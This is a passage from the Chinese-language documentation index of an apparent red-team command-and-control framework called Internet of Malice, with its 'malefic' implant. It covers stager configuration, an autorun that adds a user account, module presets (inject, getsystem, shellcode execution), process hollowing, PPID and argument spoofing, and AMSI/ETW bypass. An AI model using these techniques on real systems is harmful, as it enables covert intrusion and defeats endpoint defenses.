Stager\uff0c\u8d1f\u8d23\u4ece\u670d\u52a1\u5668\u4e0b\u8f7d\u5e76\u6267\u884c\u4e3b\u8981\u7684 Beacon \u8f7d\u8377\u3002</p> <p>\u5176\u6240\u4f9d\u8d56\u7684\u914d\u7f6e\u4f4d\u4e8e malefic/config.yaml \u6587\u4ef6\u7684 pulse \u6a21\u5757</p> <pre><code>pulse:\n  flags:\n    start: 0x41             # \u4ea4\u4e92 body \u7684\u5f00\u59cb\u6807\u5fd7\n    end: 0x42               # \u4ea4\u4e92 body \u7684\u7ed3\u675f\u6807\u5fd7\n    magic: \"beautiful\"      # \u968f\u673a\u6821\u9a8c\n    artifact_id: 0          # \u7528\u4e8e\u63a7\u5236\u6240\u62c9\u53d6\u7684\u9636\u6bb5\n  encryption: xor           # body \u52a0\u5bc6\u65b9\u5f0f (\u76ee\u524d\u4e3a xor)\n  key: \"maliceofinternal\"   # \u52a0\u5bc6\u7684 `key` \u503c\n  target: 127.0.0.1:80     # \u76ee\u6807\u670d\u52a1\u5668\u5730\u5740  \n  protocol: \"http\"          # \u901a\u4fe1\u534f\u8bae\n  http:\n    method: \"POST\"\n    path: \"/pulse\"\n    host: \"127.0.0.1\"\n    version: \"1.1\"\n    headers:\n      User-Agent: \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\"\n</code></pre>"},{"location":"IoM/manual/implant/build/#46-autorun\u914d\u7f6e","title":"4.6 autorun\u914d\u7f6e","text":"<p>autorun\u672c\u8d28\u4e0a\u662f\u5c06protobuf \u8f6c\u4e3ayaml, \u5728\u7f16\u8bd1\u65f6\u4f1a\u91cd\u65b0\u8fd8\u539f\u4e3aprotobuf\u5e76\u52a0\u5bc6\u4fdd\u5b58\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u3002 </p> <p>\u56e0\u6b64\u5177\u4f53\u5b8c\u6574\u7684\u80fd\u529bimplant\u7684\u80fd\u529b\uff0c \u6240\u6709\u80fd\u901a\u8fc7\u5404\u79cd\u63d2\u4ef6\u5b9e\u73b0\u7684\u529f\u80fd\u90fd\u53ef\u4ee5\u901a\u8fc7autorun\u5b9e\u73b0\u3002</p> <p>yaml\u793a\u4f8b:</p> <pre><code>-  \n  name: bof  \n  body: !ExecuteBinary  \n    name: service  \n    bin: !File \"addservice.o\"\n-\n  name: exe\n  body: !ExecRequest\n    args:\n      - net\n      - user\n      - add\n      - ....\n</code></pre>"},{"location":"IoM/manual/implant/modules/","title":"modules","text":""},{"location":"IoM/manual/implant/modules/#internalmodule","title":"InternalModule","text":"<p>internal module\u662f\u4e00\u7ec4\u5728malefic-core\u4e2d\u5b9a\u4e49\u7684\u57fa\u672cmodule, \u7528\u4e8emodule\u7ba1\u7406, addon\u7ba1\u7406, sleep\u7ba1\u7406, \u521d\u59cb\u5316\u7b49\u7b49\u529f\u80fd.</p>"},{"location":"IoM/manual/implant/modules/#basic","title":"basic","text":"<ul> <li>sleep, \u8c03\u6574sleep\u95f4\u9694</li> <li>suicide, \u9000\u51faimplant\u8fdb\u7a0b</li> <li>ping, \u4ea4\u6362\u5fc3\u8df3\u5305</li> <li>clear, \u6e05\u9664\u6240\u6709\u989d\u5916\u52a0\u8f7d\u7684modules\u4e0eaddons</li> <li>init, \u7528\u4e8ebind\u6a21\u5f0f\u4e0b\u7684\u521d\u59cb\u5316</li> </ul>"},{"location":"IoM/manual/implant/modules/#module\u7ba1\u7406","title":"module\u7ba1\u7406","text":"<p>module\u662fmalefic\u529f\u80fd\u7684\u57fa\u672c\u5355\u5143, \u6bcf\u4e2aspite\u90fd\u4f1a\u9009\u62e9\u4e00\u4e2a\u5bf9\u5e94\u7684module\u8fdb\u884c\u5404\u79cd\u5404\u6837\u7684\u64cd\u4f5c. </p> <p>malefic \u63d0\u4f9b\u4e86\u4e00\u5957\u52a8\u6001\u52a0\u8f7d\u7ec4\u88c5\u7684\u673a\u5236, \u8ba9\u7528\u6237\u53ef\u4ee5\u6839\u636e\u4f7f\u7528\u573a\u666f\u81ea\u884c\u7ec4\u88c5module</p> <p>\u7f16\u8bd1\u65f6\u6dfb\u52a0\u7684\u6a21\u5757\u65e0\u6cd5\u88ab\u5378\u8f7d</p> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u597d\u6d88\u606f\u4e0e\u4e00\u4e2a\u574f\u6d88\u606f. \u574f\u6d88\u606f\u662f\u7f16\u8bd1\u65f6\u7ec4\u88c5\u7684\u6a21\u5757\u65e0\u6cd5\u88ab\u5378\u8f7d, \u56e0\u6b64\u8bf7\u6839\u636e\u81ea\u5df1\u7684\u4f7f\u7528\u573a\u666f\u9009\u62e9\u5408\u9002\u7684\u9884\u8bbe. \u597d\u6d88\u606f\u662f\u867d\u7136\u65e0\u6cd5\u5378\u8f7d, \u4f46\u52a0\u8f7d\u65b0\u6a21\u5757\u65f6\u5982\u9009\u7528\u4e86\u540c\u6837\u540d\u79f0\u7684\u6a21\u5757, \u65b0\u6a21\u5757\u5c06\u8986\u76d6\u672c\u4f53\u7684\u6a21\u5757.(\u5728\u5185\u5b58\u4e2d\u539f\u672c\u7684\u6a21\u5757\u4f9d\u65e7\u4f1a\u5b58\u5728)</p> <ul> <li><code>list_module</code> \u547d\u4ee4\u5217\u51fa\u5f53\u524d\u6240\u6709module</li> <li><code>load_module</code> \u547d\u4ee4\u5219\u652f\u6301\u52a8\u6001\u52a0\u8f7d\u672c\u5730\u65b0\u7ec4\u88c5\u7684\u6a21\u5757\uff0c \u53ea\u9700\u8981 <code>load_modules --name xxx --path module.dll</code> \u5373\u53ef\u52a8\u6001\u52a0\u8f7d\u65b0\u7684\u6a21\u5757\uff0c \u8bf7\u6ce8\u610f\uff0c \u5982\u672c\u4f53\u5df2\u7ecf\u542b\u6709\u7684\u6a21\u5757\uff08\u751f\u6210\u65f6\u7ec4\u88c5\u7684\u6a21\u5757\uff09\uff0c \u518d\u6b21\u52a0\u8f7d\u5c06\u4f1a\u8986\u76d6\u8be5\u6a21\u5757\u7684\u529f\u80fd\uff0c \u662f\u7684\uff0c <code>load_modules</code> \u5141\u8bb8\u8986\u76d6\u672c\u4f53\u529f\u80fd</li> <li><code>refresh_module</code>  \u547d\u4ee4\u5c06\u4f1a\u5378\u8f7d\u6240\u6709\u52a8\u6001\u52a0\u8f7d\u7684\u6a21\u5757\uff0c \u5305\u62ec\u8986\u76d6\u6389\u7684\u672c\u4f53\u6a21\u5757\uff0c \u4e00\u5207\u6a21\u5757\u5c06\u6062\u590d\u6210\u7f16\u8bd1\u65f6\u7684\u521d\u59cb\u72b6\u6001</li> </ul> <p>client\u7684\u4f7f\u7528\u8bf7\u89c1\u4f7f\u6587\u6863module\u90e8\u5206</p>"},{"location":"IoM/manual/implant/modules/#addon-\u7ba1\u7406","title":"addon \u7ba1\u7406","text":"<p>addon \u662f\u4e3a\u4e86\u51cf\u5c11\u6570\u636e\u91cd\u590d\u4f20\u8f93, \u63d0\u4f9b\u4e86\u5c06\u6570\u636e\u4e34\u65f6\u52a0\u5bc6\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\u7684\u673a\u5236. </p> <pre><code>* list_addon ,\u5217\u51fa\u5df2\u52a0\u8f7d\u7684addon\n* load_addon , \u52a0\u8f7d\u65b0addon\n* execute_addon , \u6267\u884c\u5df2\u52a0\u8f7d\u7684addon\n* refresh_addon , \u6e05\u9664\u5df2\u52a0\u8f7d\u7684addon\n</code></pre> <p>client\u7684\u4f7f\u7528\u8bf7\u89c1\u4f7f\u6587\u6863addon\u90e8\u5206</p>"},{"location":"IoM/manual/implant/modules/#task\u7ba1\u7406","title":"task\u7ba1\u7406","text":"<ul> <li>query_task , \u67e5\u8be2task\u72b6\u6001</li> <li>cancel_task, \u53d6\u6d88task, \u5b9e\u9645\u4e0a\u662f\u8f6f\u53d6\u6d88\uff0c \u53ea\u662f\u4e0d\u518d\u5904\u7406\u76f8\u5173\u4efb\u52a1\u7684\u8f93\u5165\u548c\u8fd4\u56de</li> </ul> <p>client\u7684\u4f7f\u7528\u8bf7\u89c1\u4f7f\u6587\u6863task\u90e8\u5206</p>"},{"location":"IoM/manual/implant/modules/#module","title":"Module","text":"<p>module\u662fimplant\u4e2d\u529f\u80fd\u7684\u57fa\u672c\u5355\u5143, \u5404\u79cd\u62d3\u5c55\u80fd\u529b(bof,pe,dll)\u7684\u6267\u884c\u4e5f\u4f9d\u8d56\u4e8emodule\u5b9e\u73b0. </p>"},{"location":"IoM/manual/implant/modules/#module\u5b9a\u4e49","title":"module\u5b9a\u4e49","text":""},{"location":"IoM/manual/implant/modules/#trait","title":"trait","text":"<pre><code>#[async_trait]\npub trait Module {\n    fn name() -&gt; &amp;'static str where Self: Sized;\n    fn new() -&gt; Self where Self: Sized;\n    fn new_instance(&amp;self) -&gt; Box&lt;MaleficModule&gt;;\n    async fn run(&amp;mut self, \n                id: u32, \n                receiver: &amp;mut crate::Input, \n                sender: &amp;mut crate::Output) -&gt; Result \n</code></pre> <p>\u6211\u4eec\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4e00\u4e2a\u8fc7\u7a0b\u5b8f <code>module_impl</code>, \u53ea\u9700\u8981\u5173\u6ce8\u5177\u4f53\u529f\u80fd\u5b9e\u73b0 <code>run</code> \u51fd\u6570, \u65e0\u9700\u7f16\u5199\u91cd\u590d\u6742\u4f59\u4ee3\u7801.</p>"},{"location":"IoM/manual/implant/modules/#run\u51fd\u6570\u5b9a\u4e49","title":"run\u51fd\u6570\u5b9a\u4e49","text":"<p><code>id</code> : \u5373\u4e3a Task_id\uff0c \u5728\u524d\u9762\u7684\u6bb5\u843d\u4e2d\u6211\u4eec\u63d0\u5230\uff0c\u6bcf\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u4efb\u52a1\u90fd\u88ab\u89c6\u4e3a\u4e00\u4e2a <code>Task</code>, \u5e76\u901a\u8fc7\u552f\u4e00\u7684 <code>Task_id</code> \u6765\u8fdb\u884c\u4efb\u52a1\u72b6\u6001\u7ba1\u7406</p> <p><code>receiver</code>: \u7528\u4e8e\u63a5\u6536\u4f20\u5165\u6570\u636e, \u5927\u90e8\u5206\u60c5\u51b5\u53ea\u9700\u8981\u8c03\u7528\u4e00\u6b21\u83b7\u53d6\u4e00\u4e2amessage. \u5bf9\u4e8e\u591a\u4e2a\u8bf7\u6c42\u5305\u6216\u8005\u6301\u7eed\u6027\u7684\u6d41\u5f0f\u8f93\u5165\u7684\u573a\u666f, \u53ef\u4ee5\u8c03\u7528\u591a\u6b21receiver, \u6301\u7eed\u83b7\u5f97\u4f20\u5165\u6570\u636e. </p> <p><code>sender</code>: \u5c06\u6240\u9700\u8981\u4f20\u51fa\u7684\u6570\u636e\u53d1\u9001\u7ed9\u6570\u636e\u5904\u7406\u6a21\u5757\uff0c\u5982\u679c\u9700\u8981\u591a\u6b21\u8fd4\u56de\u6570\u636e\u7684\u51fd\u6570\u901a\u8fc7sender\u6301\u7eed\u8fd4\u56de, \u5982\u679c\u4efb\u52a1\u7ed3\u675f\u5219\u901a\u8fc7return\u8fd4\u56de.</p>"},{"location":"IoM/manual/implant/modules/#\u8fd4\u56de\u503c","title":"\u8fd4\u56de\u503c","text":"<pre><code>#[derive(Clone)]  \npub struct TaskResult {  \n    pub task_id: u32,    # taskid\n    pub body: Body,      # protobuf\u4e2d\u5bf9\u5e94\u7684Body\u7c7b\u578b\n    pub status: Status   # \u4efb\u52a1\u72b6\u6001,\u6210\u529f\u4e0e\u5426, \u9519\u8bef\u539f\u56e0\u7b49\n}\n</code></pre>"},{"location":"IoM/manual/implant/modules/#error","title":"Error","text":"<p>module \u5171\u7528\u540c\u4e00\u5957\u9519\u8bef\u4fe1\u606f, \u6b63\u5e38\u8fd0\u884c\u7684module\u8fd4\u56de\u7684\u72b6\u6001\u7801\u4e3a0</p> <pre><code>TaskError::OperatorError { .. } =&gt; 2,   // module\u5185\u90e8\u9519\u8bef\nTaskError::NotExpectBody =&gt; 3,          // body\u4e0e\u9884\u671f\u4e0d\u5339\u914d\nTaskError::FieldRequired { .. } =&gt; 4,   // \u7f3a\u5c11\u53c2\u6570\nTaskError::FieldLengthMismatch { .. } =&gt; 5,  // \u53c2\u6570\u957f\u5ea6\u4e0d\u5339\u914d\nTaskError::FieldInvalid { .. } =&gt; 6,         // \u53c2\u6570\u9519\u8bef\nTaskError::NotImpl =&gt; 99,                    // \u672a\u5b9e\u73b0\u7684module\n</code></pre>"},{"location":"IoM/manual/implant/modules/#example","title":"example","text":"<pre><code>pub struct Example {}  \n\n#[async_trait]  \n#[module_impl(\"example\")]  \nimpl Module for Example {  \n    #[allow(unused_variables)]  \n    async fn run(&amp;mut self, id: u32, receiver: &amp;mut crate::Input, sender: &amp;mut crate::Output) -&gt; Result {  \n        let request = check_request!(receiver, Body::Request)?;  \n        if request.input == \"ok\" {  \n            let mut response = Response::default();  \n            response.output = \"ok\".to_string();  \n            Ok(TaskResult::new_with_body(id, Body::Response(response)))  \n        } else {  \n            Err(anyhow::anyhow!(NotImpl))  \n        }  \n    }  \n}\n</code></pre> <p>\u53ea\u9700\u8981\u5173\u5fc3run\u51fd\u6570\u7684\u903b\u8f91, \u5373\u53ef\u4f7f\u7528rust\u5feb\u901f\u5b9e\u73b0\u4e00\u4e2a\u65b0\u7684\u6a21\u5757</p>"},{"location":"IoM/manual/implant/modules/#\u5df2\u5b9e\u73b0-modules","title":"\u5df2\u5b9e\u73b0 Modules","text":"<p>\u8bf7\u89c1: https://github.com/chainreactors/malefic/blob/master/malefic-modules/Cargo.toml#L24-L58</p> <p>malefic\u7684\u8bbe\u8ba1\u7406\u5ff5\u4e4b\u4e00\u5c31\u662f\u6a21\u5757\u5316, \u81ea\u7531\u7ec4\u88c5. modules\u90e8\u5206\u7684\u8bbe\u8ba1\u4e5f\u63d0\u73b0\u4e86\u8fd9\u4e2a\u7406\u5ff5. </p> <p>\u901a\u8fc7rust\u81ea\u5e26\u7684<code>features</code>\u76f8\u5173\u529f\u80fd, \u53ef\u4ee5\u63a7\u5236\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u7684\u6a21\u5757\u7ec4\u88c5.  </p> modules\u9884\u8bbe <pre><code>default = [\"full\"]  \n\nnano = []  \n\nfull = [\"fs_full\", \"execute_full\", \"net_full\", \"sys_full\"]  \n\nbase = [  \n    \"ls\", \"cd\", \"rm\", \"cp\", \"mv\", \"pwd\", \"cat\", \"upload\", \"download\", \"exec\", \"env\", \"info\"  \n]  \n\nextend = [  \n    \"bypass\", \"kill\", \"whoami\", \"ps\", \"netstat\", \"registry\", \"service\", \"taskschd\", \"wmi\",  \n    \"execute_bof\", \"execute_shellcode\", \"execute_assembly\", \"execute_armory\",  \n    \"execute_exe\", \"execute_dll\", \"execute_local\", \"mkdir\", \"chmod\"  \n]  \n\nfs_full = [  \n    \"ls\", \"cd\", \"rm\", \"cp\", \"mv\", \"pwd\", \"mem\", \"mkdir\", \"chown\", \"chmod\", \"cat\", \"pipe\"  \n]  \n\nls = []  \ncd = []  \nrm = []  \ncp = []  \nmv = []  \npwd = []  \nmem = []  \nmkdir = []  \nchmod = []  \nchown = []  \ncat = []  \npipe = []  \n\nsys_full = [  \n    \"info\", \"ps\", \"id\", \"env\", \"whoami\", \"kill\", \"bypass\", \"netstat\", \"wmi\", \"service\",  \n    \"registry\", \"taskschd\", \"getsystem\", \"runas\", \"privs\", \"inject\"  \n]  \n\ninfo = []  \nps = []  \nid = []  \nenv = []  \nwhoami = []  \nkill = []  \nbypass = []  \nnetstat = []  \nwmi = []  \nservice = []  \nregistry = []  \ntaskschd = []  \ngetsystem = []  \nrunas = []  \nprivs = []  \ninject = []  \n\nexecute_full = [  \n    \"exec\", \"execute_shellcode\", \"execute_assembly\", \"execute_powershell\",  \n    \"execute_bof\", \"execute_armory\", \"execute_exe\", \"execute_dll\", \"execute_local\"  \n]  \n\nexec = []  \nexecute_shellcode = []  \nexecute_assembly = []  \nexecute_bof = []  \nexecute_powershell = []  \nexecute_armory = []  \nexecute_exe = []  \nexecute_dll = []  \nexecute_local = []  \n\nnet_full = [\"upload\", \"download\"]  \n\nupload = []  \ndownload = []\n</code></pre> <p>\u5173\u4e8e\u8fd9\u4e9bmodule\u7684\u5177\u4f53\u914d\u7f6e\u8bf7\u89c1 build</p>"},{"location":"IoM/manual/implant/win_kit/","title":"Internet of Malice \u00b7 implant_win_kit","text":""},{"location":"IoM/manual/implant/win_kit/#process","title":"Process","text":""},{"location":"IoM/manual/implant/win_kit/#process-hollow","title":"Process hollow","text":"<p>\u5f53\u7528\u6237\u9700\u8981\u8c03\u7528 <code>PE/Shellcode</code> \u7b49\u591a\u79cd\u683c\u5f0f\u65f6\uff0c<code>Implant</code> \u63d0\u4f9b\u4e86\u57fa\u4e8e <code>Process Hollowing</code> \u7684\u529f\u80fd\u6765\u4f2a\u88c5\u8c03\u7528\u884c\u4e3a\u3002</p> <p><code>Process Hollow</code> \u7684\u6838\u5fc3\u601d\u60f3\u4e3a\u521b\u5efa\u4e00\u4e2a\u5408\u6cd5\u8fdb\u7a0b\uff0c \u968f\u540e\u9542\u7a7a\u5176\u539f\u672c\u5185\u5b58\uff0c \u5199\u5165\u6211\u4eec\u6240\u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c \u4ece\u800c\u4f2a\u88c5\u6210\u5408\u6cd5\u8fdb\u7a0b\u6267\u884c\u6d3b\u52a8</p>"},{"location":"IoM/manual/implant/win_kit/#sacrifice-process","title":"Sacrifice Process","text":"<p>\u5c3d\u7ba1 <code>Fork&amp;Run</code> \u6280\u672f\u5df2\u4e0d\u518d\u662f\u4e3b\u6d41\u7684\u64cd\u4f5c\u5b89\u5168\uff08OPSEC\uff09\u9009\u62e9\uff0c\u4f46\u67d0\u4e9b\u573a\u666f\u4e0b\u4ecd\u4e0d\u53ef\u907f\u514d\u3002\u4e3a\u7edf\u4e00\u6982\u5ff5\uff0c\u6211\u4eec\u5c06\u6240\u6709\u9700\u751f\u6210\u65b0\u8fdb\u7a0b\u7684\u64cd\u4f5c\u5b9a\u4e49\u4e3a\u751f\u6210\u4e00\u4e2a \u727a\u7272\u8fdb\u7a0b\uff0c\u6db5\u76d6\u4ee5\u4e0b\u6240\u6709\u76f8\u5173\u529f\u80fd\u3002</p>"},{"location":"IoM/manual/implant/win_kit/#\u9ed8\u8ba4\u884c\u4e3a","title":"\u9ed8\u8ba4\u884c\u4e3a","text":"<ul> <li>\u6240\u6709\u727a\u7272\u8fdb\u7a0b\u5747\u4ee5 <code>SUSPEND</code> \u548c <code>NO_WINDOW</code> \u53c2\u6570\u542f\u52a8\u3002</li> <li>\u4e3b\u7ebf\u7a0b\u5728\u540e\u7eed\u5904\u7406\u5b8c\u6210\u540e\u518d\u5524\u9192\u3002</li> <li>\u5141\u8bb8\u5728\u6682\u505c\u72b6\u6001\u4e0b\u8fdb\u884c\u591a\u79cd\u81ea\u5b9a\u4e49\u64cd\u4f5c\u3002</li> </ul>"},{"location":"IoM/manual/implant/win_kit/#\u652f\u6301\u7684\u529f\u80fd","title":"\u652f\u6301\u7684\u529f\u80fd","text":"<p>\u4ee5\u4e0b\u529f\u80fd\u9ed8\u8ba4\u4f7f\u7528\u727a\u7272\u8fdb\u7a0b\uff1a</p> <ul> <li><code>execute</code></li> <li><code>execute_exe</code></li> <li><code>execute_dll</code></li> <li><code>execute_local</code></li> <li><code>execute_shellcode</code></li> </ul> <p>\u6b64\u5916\uff0c\u8fd8\u63d0\u4f9b\u4e86\u66f4\u9ad8\u64cd\u4f5c\u5b89\u5168\u6027\u7684\u5185\u8054\u7248\u672c\uff1a</p> <ul> <li><code>inline_pe</code></li> <li><code>inline_shellcode</code></li> <li>inline_assembly \u4e3a\u4e86\u540c\u6b65</li> </ul> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5c06\u4ee5 <code>execute_exe</code> \u529f\u80fd\u6765\u4e3e\u4f8b\u8bf4\u660e</p> <pre><code># \u547d\u4ee4\u793a\u4f8b\nexecute_exe gogo.exe -- -i 127.0.0.1\n</code></pre> <p>\u4e0a\u8ff0\u547d\u4ee4\u8868\u793a\u4ee5\u9ed8\u8ba4<code>\u727a\u7272\u8fdb\u7a0b</code> (<code>notepad.exe</code>) \u6267\u884c <code>gogo.exe</code>, \u53c2\u6570\u4e3a <code>-i 127.0.0.1</code></p> <p>\u5f53\u7136\uff0c \u7531\u4e8e\u539f\u672c\u610f\u4e49\u4e0a\u7684 <code>Fork&amp;Run</code> \u8017\u80fd\u975e\u5e38\u5de8\u5927\u4e14\u7b28\u91cd\uff0c \u5982\u679c\u786e\u5b9e\u9700\u8981\u4e5f\u53ef\u4ee5\u8003\u8651\u540e\u671f\u6dfb\u52a0</p>"},{"location":"IoM/manual/implant/win_kit/#alternate-parent-processes","title":"Alternate Parent Processes","text":"<p>\u6240\u6709\u4e0a\u8ff0\u652f\u6301 <code>\u727a\u7272\u8fdb\u7a0b</code> \u7684\u529f\u80fd\u5747\u53ef\u4ee5\u81ea\u5b9a\u4e49 <code>\u727a\u7272\u8fdb\u7a0b</code> \u7684 <code>ppid</code>, \u53ea\u9700\u5728\u8c03\u7528\u547d\u4ee4\u65f6\u6dfb\u52a0 <code>-p</code> \u53c2\u6570\u5373\u53ef</p> <p>\u53ef\u4ee5\u4f7f\u7528 <code>ps</code> \u547d\u4ee4\u83b7\u53d6\u5f53\u524d\u6240\u6709\u8fdb\u7a0b\u7684\u5feb\u7167\u5185\u5bb9</p> <pre><code># \u547d\u4ee4\u793a\u4f8b\nexecute_shellcode -p 8888 -n \"notepad.exe\" ./loader.bin\n</code></pre> <p>\u4e0a\u8ff0\u547d\u4ee4\u8868\u793a\u4ee5<code>notepad.exe</code> \u4f5c\u4e3a\u727a\u7272\u8fdb\u7a0b\u6267\u884c <code>loader.bin</code> \uff0c \u5e76\u8fdb\u884c\u7236\u8fdb\u7a0b\u6b3a\u9a97\uff0c \u5c06 <code>ppid</code> \u8bbe\u4e3a <code>8888</code></p>"},{"location":"IoM/manual/implant/win_kit/#spoof-process-arguments","title":"Spoof Process Arguments","text":"<p>\u7531\u4e8e\u6240\u6709\u7684\u727a\u7272\u8fdb\u7a0b\u90fd\u4f1a\u4ee5 <code>SUSPEND</code> \u53c2\u6570\u542f\u52a8\uff0c \u56e0\u6b64\u5728\u6267\u884c\u547d\u4ee4\u65f6\uff0c \u6211\u4eec\u53ef\u4ee5\u5bf9\u4ece\u542f\u52a8\u5230\u771f\u6b63\u6267\u884c\u65f6\u7684\u53c2\u6570\u8fdb\u884c\u66ff\u6362\uff0c \u5373\u5728\u521b\u5efa\u727a\u7272\u8fdb\u7a0b\u65f6\u4ee5\u4f2a\u88c5\u7684\u547d\u4ee4\u521b\u5efa\uff0c \u800c\u5728\u727a\u7272\u8fdb\u7a0b\u6267\u884c\u65f6\u4ee5\u771f\u5b9e\u547d\u4ee4\u8fd0\u884c\uff0c \u6211\u4eec\u4e3a\u6240\u6709\u7684\u5e26\u6709\u727a\u7272\u8fdb\u7a0b\u7684\u529f\u80fd\u90fd\u63d0\u4f9b\u4e86\u8be5\u53c2\u6570</p> <p>\u771f\u5b9e\u53c2\u6570\u5c06\u88ab\u5199\u5165\u4fdd\u5b58\u8fdb\u865a\u5047\u53c2\u6570\u7684\u5185\u5b58\u4e2d\uff0c \u56e0\u6b64\uff0c \u5982\u679c\u771f\u5b9e\u53c2\u6570\u6bd4\u4f2a\u88c5\u53c2\u6570\u957f\uff0c \u8be5\u529f\u80fd\u5c06\u4e0d\u4f1a\u542f\u7528</p>"},{"location":"IoM/manual/implant/win_kit/#blocking-dlls","title":"Blocking DLLs","text":"<p>\u4f7f\u7528 <code>blockdlls start</code> \u547d\u4ee4\u6765\u4f7f\u5f97\u4ee5\u540e\u542f\u52a8\u7684\u6240\u6709\u727a\u7272\u8fdb\u7a0b\u5747\u9700\u8981\u9a8c\u8bc1\u5c06\u8981\u52a0\u8f7d\u7684 <code>DLL</code> \u7684\u7b7e\u540d\uff0c \u975e\u5fae\u8f6f\u7b7e\u540d\u7684 <code>DLL</code> \u5c06\u4f1a\u88ab\u7981\u6b62\u52a0\u8f7d\u4e8e\u6211\u4eec\u7684 <code>\u727a\u7272\u8fdb\u7a0b\u4e2d</code>, \u4f7f\u7528 <code>blockdlls stop</code> \u547d\u4ee4\u6765\u7ed3\u675f\u8fd9\u4e00\u884c\u4e3a</p> <p>\u8be5\u529f\u80fd\u9700\u8981\u5728 <code>Windows 10</code> \u53ca\u4ee5\u4e0a\u7cfb\u7edf\u4e2d\u4f7f\u7528</p>"},{"location":"IoM/manual/implant/win_kit/#amsi-etw-wldp","title":"AMSI &amp; ETW &amp; WLDP","text":"<p>\u5728\u7ec8\u7aef\u653b\u9632\u6f2b\u957f\u7684\u5bf9\u6297\u4e2d\uff0c <code>AMSI</code> \u53ca <code>ETW</code> \u7684\u63a8\u51fa\u53ef\u8c13\u662f\u4e00\u77f3\u6fc0\u8d77\u5343\u5c42\u6d6a\uff0c \u4f46\u5f53\u5927\u5bb6\u90fd\u4f4d\u4e8e <code>r3</code> \u65f6\uff0c \u901a\u8fc7\u4e00\u4e9b\u624b\u6cd5\u5373\u53ef\u8f7b\u677e\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c \u6211\u4eec\u4e5f\u5728\u8be5\u7248\u672c\u4e2d\u63a8\u51fa\u4e86\u57fa\u7840 <code>bypass</code> \u529f\u80fd</p> <p>\u76ee\u524d\u5e38\u89c1\u7684\u7ed5\u8fc7\u6280\u672f\u5927\u6982\u5206\u4e3a\u56db\u7c7b\uff0c \u76f4\u63a5 <code>patch</code>, <code>hook</code>\uff0c \u4fee\u6539 <code>IAT</code>\u4ee5\u53ca\u901a\u8fc7 <code>VEH</code>\u6765\u8fdb\u884c\u7ed5\u8fc7</p> <p>\u5728\u57fa\u7840\u7248\u672c\u4e2d\uff0c \u6211\u4eec\u9009\u7528\u4e86 <code>hook</code> \u6280\u672f\u6765\u4e3a\u7a0b\u5e8f\u8fdb\u884c\u8fd9\u7c7b\u68c0\u6d4b\u7684\u7ed5\u8fc7</p> <p>\u4f7f\u7528 <code>bypass</code> \u547d\u4ee4\u6765\u5f00\u542f\u7ed5\u8fc7 <code>AMSI</code> \u53ca <code>ETW</code> \u68c0\u6d4b,  <pre><code>#\u4f7f\u7528\u793a\u4f8b\nbypass\n</code></pre></p> <p>\u5f53\u7136, \u5728\u67d0\u4e9b\u529f\u80fd\u4f7f\u7528\u65f6\u6211\u4eec\u4e5f\u4f1a\u9ed8\u8ba4\u5f00\u542f <code>bypass</code> \uff0c \u4f8b\u5982</p> <ul> <li>execute_assemble</li> <li>powerpick</li> </ul> <p>\u7531\u4e8e <code>ETW</code> \u7a81\u7136\u6ca1\u6709\u4efb\u4f55\u6d88\u606f\u5f88\u7a81\u5140\u4e14\u660e\u663e\uff0c \u56e0\u6b64\u5728\u6267\u884c\u7ed3\u675f\u540e\uff0c \u6211\u4eec\u8fd8\u4f1a\u5c06\u5176\u590d\u539f</p> <p>\u4e5f\u56e0\u4e3a\u8fd9\u4e2a\u539f\u56e0\uff0c \u6211\u4eec\u5e76\u4e0d\u63a8\u8350\u76f4\u63a5\u7c97\u9c81\u7684\u8fdb\u884c <code>bypass</code> \u529f\u80fd\uff0c \u6216\u4f7f\u7528\u67d0\u4e9b\u4e0d\u5728\u6267\u884c\u540e\u4fee\u590d\u7684 <code>PE2SHELLCODE</code> \u8f6f\u4ef6\uff0c \u4ee5\u514d\u53d1\u751f\u610f\u5916</p>"},{"location":"IoM/manual/implant/win_kit/#fileless-loader","title":"Fileless Loader","text":""},{"location":"IoM/manual/implant/win_kit/#inline-pe","title":"Inline PE","text":"<p>\u67d0\u4e9b\u6781\u7aef\u60c5\u51b5\u4e0b\uff0c \u7528\u6237\u53ef\u80fd\u6709\u5728\u672c\u8fdb\u7a0b\u6267\u884c <code>PE</code> \u6587\u4ef6\u7684\u9700\u6c42\uff0c \u56e0\u6b64\u6211\u4eec\u901a\u8fc7 <code>memory load pe</code> \u6280\u672f\u4ee5\u652f\u6301\u7528\u6237\u5728 <code>Implant</code> \u4e2d\u6267\u884c <code>PE</code> \u6587\u4ef6, \u6211\u4eec\u5c06\u9ed8\u8ba4\u6355\u83b7 <code>PE</code> \u6587\u4ef6\u7684\u6807\u51c6\u8f93\u51fa</p> <p>\u60a8\u53ef\u4ee5\u4f7f\u7528 <code>inline_exe</code> / <code>inline_dll</code> \u8fdb\u884c\u8c03\u7528</p> <p>\u8bf7\u6ce8\u610f\uff0c \u7531\u4e8e\u5404\u5de5\u5177\u5b9e\u73b0\u826f\u83a0\u4e0d\u9f50\uff0c \u56e0\u6b64\u60a8\u6240\u8981\u4f7f\u7528\u7684\u5de5\u5177\u53ef\u80fd\u4f1a\u4f34\u968f\u5404\u79cd\u6cc4\u6f0f\u95ee\u9898</p> <p>\u56e0\u6b64\uff0c \u4f7f\u7528\u8be5\u529f\u80fd\u65f6\u5efa\u8bae\u52a0\u4e0a\u8d85\u65f6\u65f6\u95f4\u4ee5\u9632\u6b62\u60a8\u4e22\u5931\u81ea\u5df1\u7684\u8fde\u63a5\uff0c \u5e76\u4e14\u9700\u8981\u60a8\u81ea\u884c\u8bc4\u4f30 <code>inline</code> \u6267\u884c\u7684 <code>PE/DLL</code> \u662f\u5426\u4f1a\u4f34\u968f\u6709\u5185\u5b58\u95ee\u9898</p> <p>\u8bf7\u6ce8\u610f\uff0c\u4ee5<code>EXE</code> 